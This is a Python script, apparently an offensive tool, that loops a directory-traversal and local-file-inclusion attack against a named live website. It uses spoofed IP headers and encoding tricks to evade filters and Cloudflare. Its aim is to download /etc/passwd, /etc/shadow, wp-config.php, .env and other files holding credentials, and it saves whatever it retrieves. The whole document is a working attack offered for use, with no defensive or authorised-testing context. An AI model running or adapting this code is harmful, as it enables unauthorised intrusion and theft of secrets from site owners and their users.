#!/usr/bin/env python3
import requests
import random
import time
import os
from datetime import datetime

class InfiniteBypassTester:
    def __init__(self):
        self.target = "https://pakyok77.link"
        self.attempt = 0
        self.success_count = 0
        
    def generate_headers(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'curl/7.68.0',
            'Wget/1.20.3 (linux-gnu)',
            'python-requests/2.25.1'
        ]
        
        bypass_ips = [
            '127.0.0.1', '192.168.1.1', '10.0.0.1', '172.16.0.1',
            f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'X-Forwarded-For': random.choice(bypass_ips),
            'X-Real-IP': random.choice(bypass_ips),
            'X-Originating-IP': random.choice(bypass_ips),
            'X-Remote-IP': random.choice(bypass_ips),
            'X-Remote-Addr': random.choice(bypass_ips),
            'X-ProxyUser-Ip': random.choice(bypass_ips),
            'X-Forwarded-Host': random.choice(['localhost', '127.0.0.1', 'internal.local']),
            'X-Forwarded-Proto': 'https',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
    
    def generate_payloads(self, target_file):
        payloads = []
        
        # Basic path traversal with different depths
        for depth in range(1, 15):
            payloads.append('../' * depth + target_file)
        
        # URL encoded variations
        for depth in range(1, 10):
            payloads.append('%2e%2e%2f' * depth + target_file)
            payloads.append('%252e%252e%252f' * depth + target_file)
            payloads.append('%25252e%25252e%25252f' * depth + target_file)
        
        # Mixed encoding techniques
        payloads.extend([
            f'..\\{target_file}',
            f'..%5c{target_file}',
            f'..%255c{target_file}',
            f'....%2f%2f{target_file}',
            f'..%c0%af{target_file}',
            f'..%c1%9c{target_file}',
            f'.%2e/{target_file}',
            f'%2e%2e\\{target_file}',
            f'..%2f%2e%2e%2f{target_file}',
            f'%2e%2e%5c%2e%2e%5c{target_file}',
            f'..%00/{target_file}',
            f'..%0d%0a/{target_file}'
        ])
        
        # Filter evasion
        payloads.extend([
            target_file.replace('/', '%2f'),
            target_file.replace('/', '%252f'),
            target_file.replace('/', '\\'),
            target_file.replace('/', '%5c'),
            target_file.replace('.', '%2e'),
            target_file.replace('.', '%252e')
        ])
        
        return payloads
    
    def test_bypass(self, target_file):
        payloads = self.generate_payloads(target_file)
        parameters = ['page', 'file', 'include', 'path', 'view', 'load', 'read', 'doc', 'document', 'dir', 'folder', 'src']
        endpoints = ['index.php', 'main.php', 'view.php', 'include.php', 'file.php', 'admin.php', 'load.php', 'read.php']
        
        for endpoint in endpoints:
            for param in parameters:
                for payload in payloads:
                    self.attempt += 1
                    
                    headers = self.generate_headers()
                    url = f"{self.target}/{endpoint}"
                    
                    try:
                        response = requests.get(
                            url, 
                            params={param: payload}, 
                            headers=headers, 
                            timeout=8,
                            allow_redirects=False
                        )
                        
                        if self.check_success(response, target_file):
                            print(f"\n🎉 BYPASS SUCCESS! Attempt #{self.attempt}")
                            print(f"📁 File: {target_file}")
                            print(f"🌐 URL: {url}?{param}={payload}")
                            print(f"📊 Status: {response.status_code}")
                            print(f"📏 Size: {len(response.text)} bytes")
                            
                            self.save_file(target_file, response.text, url, param, payload)
                            return True
                        
                        if self.attempt % 100 == 0:
                            print(f"⚡ Attempt #{self.attempt} - Testing {target_file}...")
                            
                    except Exception:
                        continue
                    
                    time.sleep(0.03)
        
        return False
    
    def check_success(self, response, target_file):
        if response.status_code not in [200, 301, 302]:
            return False
        
        content = response.text.lower()
        
        # Check if blocked by Cloudflare
        if any(x in content for x in ['cloudflare', 'blocked', 'forbidden', 'ray id', 'attention required']):
            return False
        
        # File-specific success indicators
        indicators = {
            'etc/passwd': ['root:', 'bin:', 'daemon:', 'sys:', 'nobody:', '/bin/bash', '/bin/sh'],
            'etc/shadow': ['root:', '$', 'hash', '::', '!'],
            'etc/hosts': ['localhost', '127.0.0.1', 'broadcasthost'],
            'proc/version': ['linux', 'version', 'gcc', 'kernel'],
            'wp-config.php': ['db_name', 'db_user', 'db_password', 'wp_', 'mysql'],
            'config.php': ['<?php', 'database', 'password', 'host', 'user'],
            '.env': ['app_key', 'db_', 'mail_', 'redis_', 'aws_', '='],
            '.htaccess': ['rewriteengine', 'rewriterule', 'deny from', 'options']
        }
        
        for file_pattern, file_indicators in indicators.items():
            if file_pattern in target_file.lower():
                if any(indicator in content for indicator in file_indicators):
                    return True
        
        # Generic success check
        if (len(response.text) > 300 and 
            response.status_code == 200 and
            not any(x in content for x in ['<html>', '<body>', '<!doctype', '<title>'])):
            return True
        
        return False
    
    def save_file(self, target_file, content, url, param, payload):
        os.makedirs("bypass_success", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"bypass_success/{target_file.replace('/', '_').replace('\\', '_')}_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"# SUCCESSFUL BYPASS!\n")
            f.write(f"# Target File: {target_file}\n")
            f.write(f"# URL: {url}?{param}={payload}\n")
            f.write(f"# Attempt Number: {self.attempt}\n")
            f.write(f"# Timestamp: {datetime.now()}\n")
            f.write("=" * 80 + "\n\n")
            f.write(content)
        
        self.success_count += 1
        print(f"💾 Saved to: {filename}")
        print(f"📄 Content preview:")
        print("-" * 60)
        print(content[:800])
        if len(content) > 800:
            print("... [CONTENT TRUNCATED]")
        print("-" * 60)
    
    def run_infinite_test(self):
        print("🚀 INFINITE BYPASS TESTER STARTED")
        print("=" * 70)
        print("⚠️  WARNING: This will run continuously until bypass success!")
        print("🎯 Target:", self.target)
        print("🔄 Will NOT stop until files are downloaded successfully!")
        print("=" * 70)
        
        target_files = [
            'etc/passwd',
            'etc/shadow',
            'etc/hosts',
            'proc/version',
            'proc/cpuinfo',
            'wp-config.php',
            'config.php',
            '.env',
            '.htaccess',
            'database.php'
        ]
        
        round_count = 0
        
        while True:
            round_count += 1
            print(f"\n🔄 ROUND #{round_count} - Testing all files...")
            
            for target_file in target_files:
                print(f"\n🔍 Testing: {target_file}")
                
                if self.test_bypass(target_file):
                    print(f"✅ SUCCESS! Downloaded: {target_file}")
                    # Continue testing other files
                    continue
                else:
                    print(f"❌ Failed: {target_file} (Attempt #{self.attempt})")
            
            if self.success_count > 0:
                print(f"\n🎉 BREAKTHROUGH ACHIEVED!")
                print(f"✅ Successfully downloaded {self.success_count} files!")
                break
            
            print(f"\n🔄 Round {round_count} completed. Total attempts: {self.attempt}")
            print("🚀 Starting next round with evolved techniques...")
            time.sleep(2)

def main():
    tester = InfiniteBypassTester()
    tester.run_infinite_test()

if __name__ == "__main__":
    main()